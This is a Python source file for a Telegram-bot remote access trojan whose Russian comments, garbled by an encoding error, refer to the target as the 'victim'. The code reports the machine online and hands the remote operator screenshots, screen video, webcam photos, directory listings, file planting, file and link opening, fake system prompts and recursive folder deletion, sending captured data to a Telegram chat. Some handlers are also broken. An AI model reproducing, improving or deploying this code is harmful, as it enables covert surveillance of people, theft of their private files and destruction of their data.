import telebot
from telebot import types
import time
import pyautogui as pag
import cv2
import os
from os import listdir
from os.path import isfile, join
import os.path
import requests
import platform as pf
import random
import ctypes # --> —Ç—É—Ç –º–æ–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å –æ—á–µ–Ω—å –º–Ω–æ–≥–æ –∫—Ä—É—Ç–æ–≥–æ —Å —ç—Ç–æ–π –±–∏–±–∏–ª–∏–æ—Ç–µ–∫–æ–π :)
import webbrowser as wb
import numpy as np
from moviepy.editor import VideoFileClip
import shutil


isFalse = False

API_TOKEN = "" #Your Bot API token
chat_id = "" #Your privat chat-id

bot = telebot.TeleBot(API_TOKEN)

requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage?chat_id={chat_id}&text=Online")

rand = []
rand = random.random() * 100
rand = str(rand)

#keyboard1 = types.ReplyKeyboardMarkup(resize_keyboard = True)
#keyboard2 = types.KeyboardButton()

#–ü–†–û–°–¢–û –°–¢–ê–†–¢ –ò –§–£–ù–ö–¶–ò–Ø –ö–û–¢–û–†–ê–Ø –û–ü–†–ï–î–ï–õ–Ø–ï–¢ –ö–ù–û–ü–ö–ò
@bot.message_handler(commands = ["start"])
def start(message):
	rmk = types.ReplyKeyboardMarkup(resize_keyboard = True)
	#btns = ['/ip', '/spec', '/screenshot', '/webcam', '/message', '/input', '/walp', '/exit']
	btns = ["/ip - Addressüåé", '/spec - Specifications ‚öô', '/scr - Screenshot üëÄ', '/record', '/view', '/cam - WebCam üì∑' ,'/msg - Message ‚úâ', 
	'/inp - Input üì©', '/walp - Wallpaper üñº', '/link - Linking', '/upload', '/open', '/delete', '/exit']
	for btn in btns:
		rmk.add(types.KeyboardButton(btn))
	bot.send_message(message.chat.id,
		"""–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:
		/ip - –ü–æ–ª—É—á–∏—Ç—å IP –∞–¥—Ä–µ—Å
		/spec - –ü–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–∏—Å—Ç–µ–º–µ
		/screenshot - –ü–æ–ª—É—á–∏—Ç—å —Å–Ω–∏–º–æ–∫ —ç–∫—Ä–∞–Ω–∞
		/record - –ó–∞–ø–∏—Å–∞—Ç—å –≤–∏–¥–µ–æ —Å –µ–∫—Ä–∞–Ω–∞ –∂–µ—Ä—Ç–≤—ã
		/view - –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å —Ñ–∞–π–ª—ã –≤ –ø–∞–ø–∫–µ –ø–æ —É–∫–∞–∑–∞–Ω–Ω–æ–º—É –≤–∞–º–∏ –ø—É—Ç–∏
		/webcam - –ü–æ–ª—É—á–∏—Ç—å —Å–Ω–∏–º–æ–∫ —ç–∫—Ä–∞–Ω–∞
		/message - –û—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ
		/input - –û—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ -—Å –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å—é –æ—Ç–≤–µ—Ç–∞
		/wallpaper - –°–º–µ–Ω–∏—Ç—å –æ–±–æ–∏
		/photo - –§–æ—Ç–æ
		/link - –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç —Å–∞–π—Ç —Å –≤–∞—à–µ–º —Å—Å—ã–ª–∫–æ–π
		/upload - –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª
		/open - –æ—Ç–∫—Ä—ã—Ç—å —Ñ–∞–π–ª
		/delete - —É–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª –ø–æ –ø—É—Ç–∏
		/exit - –í—ã–π—Ç–∏ –∏–∑ –±–æ—Ç–∞ (–û–Ω –æ—Å—Ç–∞–Ω–æ–≤–∏—Ç —Å–≤–æ—é —Ñ—É–Ω–∫—Ü–∏—é —á—Ç–æ –Ω–µ —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—å—Å—è!)
		
		""", reply_markup=rmk)
@bot.message_handler(content_types=["text"])
def commands_handler(message):
	if message.text == "/ip - Addressüåé":
		ip_adress(message)
	elif message.text == "/ip":
		ip_adress(message)
	elif message.text == "/spec - Specifications ‚öô":
		spec(message)
	elif message.text == "/spec":
		spec(message)
	elif message.text == "/scr - Screenshot üëÄ":
		screenshot(message)
	elif message.text == "/scr":
		screenshot(message)
	elif message.text == "/record":
		video_recorder(message)
	elif message.text == "/view":
		view_message_handle(message)
	elif message.text == "/cam - WebCam üì∑":
		webcam(message)
	elif message.text == "/cam":
		webcam(message)
	elif message.text == "/msg - Message ‚úâ":
		message_sending(message)
	elif message.text == "/msg":
		message_sending(message)
	elif message.text == "/inp - Input üì©":
		message_sending_with_input(message)
	elif message.text == "/inp":
		message_sending_with_input(message)
	elif message.text == "/walp - Wallpaper üñº":
		wallpaper(message)
	elif message.text == "/walp":
		wallpaper(message)
	elif message.text == "/link - Linking":
		linking(message)
	elif message.text == "/link":
		linking(message)
	elif message.text == "/upload":
		upload_file(message)
	elif message.text == "/open":
		open_file(message)
	elif message.text == "/delete":
		delete_file(message)
	elif message.text == "/exit":
		exit(message)

#–í–´–ß–ò–°–õ–Ø–ï–ú –ê–ô–ü–ò
@bot.message_handler(commands = ["ip"])
def ip_adress(message):
	response = requests.get("http://jsonip.com").json()
	bot.send_message(message.chat.id, f"IP Adress: {response['ip']}")

#–ù–ê–ë–õ–Æ–î–ï–ù–ò–ï –ó–ê –ö–û–ú–ü–û–ú
@bot.message_handler(commands = ["spec"])
def spec(message):
	info = f"Name PC: {pf.node()}\nProcessor: {pf.processor()} \nSystem:{pf.system()} \nrelease_data: {pf.release()}"
	bot.send_message(message.chat.id, info)

#–°–ö–†–ò–ù–®–û–¢ –ï–ö–†–ê–ù–ê
@bot.message_handler(commands = ["screenshot"])
def screenshot(message):
	pag.screenshot(rand + '.jpg')
	#pag.screenshot(r"C:/Users/User111/Desktop/–í–°–ï–í–°–ï –ü–∞–ø–∫–∏/
					#Python projects/screens" + rand + ".png")

	with open(rand + '.jpg', 'rb') as img:
		bot.send_photo(message.chat.id, img)

#–ó–∞–ø–∏—Å—å –≤–∏–¥–µ–æ —Å –º–æ–Ω–∏—Ç–æ—Ä–∞
@bot.message_handler(commands = ["video_record"])
def video_recorder(message):
	try:
		screen_sz = pag.size()
		fourcc = cv2.VideoWriter_fourcc(*'XVID')
		out = cv2.VideoWriter('output.avi', fourcc, 10.0, (screen_sz))
	    
		for i in range(80):
			img = pag.screenshot()
			frame = np.array(img)
			frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
			out.write(frame)
			cv2.imshow("screenshot",  frame)

			if cv2.waitKey(1) == ord("q"):
				break
	        
		cv2.destroyAllWindows()
		out.release()

		# Convert the AVI file to MP4 using MoviePy
		clip = VideoFileClip('output.avi')
		clip.write_videofile('output.mp4')
		clip.close()

		# Send the MP4 video file using bot.send_video
		video = open('output.mp4', 'rb')
		bot.send_video(message.chat.id, video)

		# Delete the video files
		video.close()
		os.remove('output.avi')
		os.remove('output.mp4')

	except Exception as ex:
		bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞: {ex}")



@bot.message_handler(commands=['view files'])
def view_message_handle(message):
	msg = bot.send_message(message.chat.id, "–í –∫–∞–∫–æ–π –ø–∞–ø–∫–µ –ø–æ—Å–º–æ—Ç—Ä–∏–º —Ñ–∞–π–ª—ã?")
	bot.register_next_step_handler(msg, next_view_message)

def next_view_message(message):
	try:
		viewed = os.listdir(message.text)
		# –§—É–Ω–∫—Ü–∏—è, –∫–æ—Ç–æ—Ä–∞—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç 0 –µ—Å–ª–∏ –µ—Å—Ç—å —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ –∏ 1 –µ—Å–ª–∏ –Ω–µ—Ç
		def the_sorted(file):
			return 1 if '.' in file else 0
		# –°–æ—Ä—Ç–∏—Ä—É–µ–º —Å–ø–∏—Å–æ–∫, –ø–æ–º–µ—â–∞—è —Ñ–∞–π–ª—ã —Å —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ–º –≤ –Ω–∞—á–∞–ª–æ —Å–ø–∏—Å–∫–∞
		viewed_sorted = sorted(viewed, key = the_sorted)

		viewed_all = '\n'.join(viewed_sorted)
		bot.send_message(message.chat.id, viewed_all)
	except Exception as ex:
		bot.send_message(message.chat.id, f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {ex}")

#–ó–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–æ–≤ –Ω–∞ –∫–æ–º–ø –∂–µ—Ä—Ç–≤—ã
@bot.message_handler(commands=['upload'])
def upload_file(message):
	bot.send_message(message.chat.id, "–û—Ç–ø—Ä–∞–≤—å —Ñ–∞–π–ª –∫–æ—Ç–æ—Ä—ã–π —Ç—ã —Ö–æ—á–µ—à—å –∑–∞–≥—Ä—É–∑–∏—Ç—å")

	@bot.message_handler(content_types=['document'])
	def handle_file(message):
		if message.document is None:
			bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å —É—Å—Ç–∞–Ω–æ–≤–∫–∏: ")
			return

		file_info = bot.get_file(message.document.file_id)
		if file_info is None:
			bot.send_message(message.chat.id, "–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Ñ–∞–π–ª–µ –Ω–µ –±—ã–ª–∞ –ø–æ–ª—É—á–µ–Ω–∞")
			return

		downloaded_file = bot.download_file(file_info.file_path)
		if downloaded_file is None:
			bot.send_message(message.chat.id, "–§–∞–π–ª –Ω–µ —É–¥–∞–ª–æ—Å—å —Å–∫–∞—á–∞—Ç—å")
			return

		msg = bot.send_message(message.chat.id, "–£–∫–∞–∂–∏—Ç–µ –ø—É—Ç—å –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–∞")
		bot.register_next_step_handler(msg, file_download)

	def file_download(message):
		try:
			file_path = message.text.strip()
			try:
				with open(file_path, 'wb') as new_file:
					new_file.write(downloaded_file)
				bot.send_message(message.chat.id, "–§–∞–π–ª –∑–∞–≥—Ä—É–∂–µ–Ω")
			except PermissionError:
				bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞: –Ω–µ—Ç —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –Ω–∞ –∑–∞–ø–∏—Å—å –≤ '{file_path}'. –í–≤–µ–¥–∏—Ç–µ –¥—Ä—É–≥–æ–π –ø—É—Ç—å:")
				bot.register_next_step_handler(message, process_download)
		except Exception as e:
			bot.send_message(message.chat.id, f"–í–æ–∑–Ω–∏–∫–ª–∞ –æ—à–∏–±–∫–∞: {e}")

#–û—Ç–∫—Ä—ã—Ç–∏–µ —Ñ–∞–π–ª–æ–≤ (–ª—é–±—ã—Ö)
@bot.message_handler(commands=['open_file'])
def open_file(message):
	msg = bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É –µ–≥–æ –Ω–∞–∑–≤–∞–Ω–∏–µ –∏ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ: ")
	bot.register_next_step_handler(msg, next_open_file)

def next_open_file(message):
	try:
		path = (message.text)
		os.open (path)
		bot.send_message(message.chat.id, '–§–∞–π–ª –æ—Ç–∫—Ä—ã—Ç')

	except Exception as ex:
		bot.send_message(message.chat.id, '–í–æ–∑–Ω–∏–∫–ª–∏ –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ —Ç—Ä—É–¥–Ω–æ—Å—Ç–∏...{ex}')


#–ü–†–û–°–ú–û–¢–† –ö–ê–ú–ï–†–´ –ñ–ï–†–¢–í–´ (–§–æ—Ç–æ)
@bot.message_handler(commands = ["webcam"])
def webcam(message):
	filename = "cam.jpg"
	cap = cv2.VideoCapture(1)

	for i in range(10):
		cap.read()

	ret, frame = cap.read()

	cv2.imwrite(filename, frame)
	cap.release()

	with open(filename, "rb") as img:
		bot.send_photo(message.chat.id, img)
	os.remove(filename)
		
#–û–î–ù–û–°–¢–û–†–û–ù–ù–ï–ï –°–û–û–ë–©–ï–ù–ò–ï –û–¢ –ú–ï–ù–Ø
@bot.message_handler(commands = ["message"])
def message_sending(message):
	msg = bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –≤–∞—à–µ —Å–æ–æ–±—â–µ–Ω–∏–µ: ")
	bot.register_next_step_handler(msg, next_message_sending)

def next_message_sending(message):
	try:
		pag.alert(message.text, 'System_Message')
	except Exception:
		bot.send_message(message.chat.id, '–í–æ–∑–Ω–∏–∫–ª–∏ –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ —Ç—Ä—É–¥–Ω–æ—Å—Ç–∏...')

#–°–û–û–ë–©–ï–ù–ò–ï –ù–ê –ö–û–¢–û–†–û–ï –ú–û–ñ–ù–û –û–¢–í–ï–¢–ò–¢–¨
@bot.message_handler(commands = ["input"])
def message_sending_with_input(message):
	msg = bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –≤–∞—à–µ —Å–æ–æ–±—â–µ–Ω–∏–µ: ")
	bot.register_next_step_handler(msg, next_message_sending_with_input)

def next_message_sending_with_input(message):
	try:
		answer = pag.prompt(message.text, 'Input_Your_Answer')#ico name
		bot.send_message(message.chat.id, answer)
	except Exception:
		bot.send_message(message.chat.id, "–í–æ–∑–Ω–∏–∫–ª–∏ –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ —Ç—Ä—É–¥–Ω–æ—Å—Ç–∏... –∏–ª–∏ –Ω–µ—Ç—É –æ—Ç–≤–µ—Ç–∞")

#–°–ú–ï–ù–ê –û–ë–û–ï–í
@bot.message_handler(commands=["wallpaper"])
def wallpaper(message):
	msg = bot.send_message(message.chat.id, "–û—Ç–ø—Ä–∞–≤—å—Ç–µ –∫–∞—Ä—Ç–∏–Ω–∫—É:")
	bot.register_next_step_handler(msg, set_wallpaper)


@bot.message_handler(content_types=["photo"])
def set_wallpaper(message):
	try:
		file = message.photo[-1].file_id
		file = bot.get_file(file)

		download_file = bot.download_file(file.file_path)
		with open("image.jpg", "wb") as img:
			img.write(download_file)
		bot.send_message(message.chat.id, "–û–±–æ–∏ —É—Å–ø–µ—à–Ω–æ –±—ã–ª–∏ –∑–∞–º–µ–Ω–µ–Ω—ã")
		
		path = os.path.abspath("image.jpg")
		ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
		
	except Exception as ex:
		bot.send_message(message.chat.id, f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {ex}")
#–û—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É
@bot.message_handler(commands=["link"])
def linking(message):
	msg = bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –≤–∞—à—É —Å—Å—ã–ª–∫—É: ")
	bot.register_next_step_handler(msg, next_linking)

def next_linking(message):
	try:
		link = wb.open_new_tab(message.text)#ico
		bot.send_message(message.chat.id, link)
		bot.send_message(message.chat.id, "–°—Å—ã–ª–∫–∞ –±—ã–ª–∞ –æ—Ç–∫—Ä—ã—Ç–∞")
	except Exception as ex:
		bot.send_message(message.chat.id, "–í–æ–∑–Ω–∏–∫–ª–∏ –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ —Ç—Ä—É–¥–Ω–æ—Å—Ç–∏... –∏–ª–∏ –Ω–µ—Ç—É —Å–∞–π—Ç–∞ {ex}")

#–£–¥–∞–ª—è–µ—Ç –ø–∞–ø–∫—É —Å —Ñ–∞–π–ª–∞–º–∏(—Å–∏–ª—å–Ω–æ –º–æ–∂–Ω–æ –ø–æ–¥–Ω–∞—Å—Ä–∞—Ç—å
#—è —Å–µ–±–µ —Ç–∞–∫ –æ–¥–Ω–∞–∂–¥—ã –ø–æ–ª —Ä–∞–±–æ—á–µ–≥–æ —Å—Ç–æ–ª–∞ –Ω–∞—Ö—É–π —É–¥–∞–ª–∏–ª)
@bot.message_handler(commands=['delete files'])
def delete_file(message):
	msg = bot.send_message(message.chat.id, "–∫–∞–∫—É—é –ø–∞–ø–∫—É —Ç—ã —Ö–æ—á–µ—à—å —É–¥–∞–ª–∏—Ç—å?")
	bot.register_next_step_handler(msg, next_delete_file)

def next_delete_file(message):
	try:
		shutil.rmtree(message.text)
		bot.send_message(message.chat.id,  f"–ü–∞–ø–∫–∞ —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω–∞")
	except Exception as ex:
		bot.send_message(message.chat.id, f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {ex}")

#–ü–†–û–°–¢–û –í–´–•–û–î –ò–ó –ü–†–û–ì–ò
@bot.message_handler(commands = ["exit"])
def exit():
	bot.send_message(message.chat.id, "–ü—Ä–æ–≥—Ä–∞–º–º–∞ –æ—Ñ–Ω—É—Ç–∞")
	exit (0)
	print ('–ó–∞–∫—Ä—ã—Ç–∏–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã')
	

#–ó–ê–ü–£–°–ö –ü–†–û–ì–ò
if __name__ == '__main__':
	bot.polling()
